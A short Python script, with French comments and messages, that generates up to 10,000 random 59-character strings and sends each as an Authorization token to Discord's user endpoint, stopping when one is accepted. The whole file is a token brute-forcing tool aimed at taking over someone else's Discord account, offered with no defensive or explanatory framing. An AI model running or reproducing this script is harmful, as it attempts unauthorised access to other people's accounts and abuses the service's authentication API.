import urllib.request
import random
import string

def generate_random_token(length=59):
    characters = string.ascii_letters + string.digits + '-_'
    return ''.join(random.choice(characters) for i in range(length))

def test_discord_token(token):
    request = urllib.request.Request('https://discord.com/api/v9/users/@me')
    request.add_header('Authorization', token)
    try:
        with urllib.request.urlopen(request) as response:
            if response.getcode() == 200:
                print(f"Le token {token} est valide. Accès autorisé.")
                return True
            else:
                print(f"Le token {token} n'est pas valide.")
    except urllib.error.HTTPError as e:
        print(f"Le token {token} n'est pas valide. Code d'erreur : {e.code}")
    return False

def main():
    num_tokens = 10000  # Nombre total de tokens à générer et tester

    for _ in range(num_tokens):
        token = generate_random_token()
        print(f"Génération du token : {token}")
        if test_discord_token(token):
            break

if __name__ == "__main__":
    main()
